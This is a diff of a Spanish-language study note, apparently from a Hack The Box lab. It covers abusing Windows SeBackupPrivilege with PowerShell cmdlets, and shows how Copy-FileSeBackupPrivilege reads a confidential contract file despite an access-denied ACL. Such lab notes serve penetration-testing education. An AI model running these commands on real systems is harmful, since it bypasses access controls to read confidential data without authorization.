@@ -48,16 +48,16 @@
 ### Importar módulos PowerShell
 
 ```powershell
-PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
-PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
 
 ### Verificar privilegios
 
 ```powershell
-PS C:\htb> whoami /priv
+whoami /priv
 # o usando el cmdlet
-PS C:\htb> Get-SeBackupPrivilege
+Get-SeBackupPrivilege
 ```
 
 Salida:
@@ -71,8 +71,8 @@ SeChangeNotifyPrivilege      Bypass traverse checking       Enabled
 ### Habilitar SeBackupPrivilege
 
 ```powershell
-PS C:\htb> Set-SeBackupPrivilege
-PS C:\htb> Get-SeBackupPrivilege
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
 SeBackupPrivilege is enabled
 ```
 
@@ -85,11 +85,34 @@ SeBackupPrivilege is enabled
 ### Escenario: no puedo hacer `cat` pero sí puedo copiar con el PoC
 
 ```powershell
-PS C:\htb> dir C:\Confidential\
-PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'  # => Access denied
-PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+dir C:\Confidential\
+
+    Directory: C:\Confidential
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         5/6/2021   1:01 PM             88 2021 Contract.txt
+
+cat 'C:\Confidential\2021 Contract.txt' 
+
+cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
+At line:1 char:1
++ cat 'C:\Confidential\2021 Contract.txt'
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
+   izedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+
+Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
 Copied 88 bytes
-PS C:\htb> cat .\Contract.txt  # => muestra el contenido copiado
+cat .\Contract.txt
+Inlanefreight 2021 Contract
+
+==============================
+
+Board of Directors:
+
+<...SNIP...>
 ```
 
 **Explicación:** `Copy-FileSeBackupPrivilege` usa la semántica de backup para leer el archivo ignorando ACLs normales (salvo entradas *Deny*). Permite acceder a información sensible sin tener ACE directa.
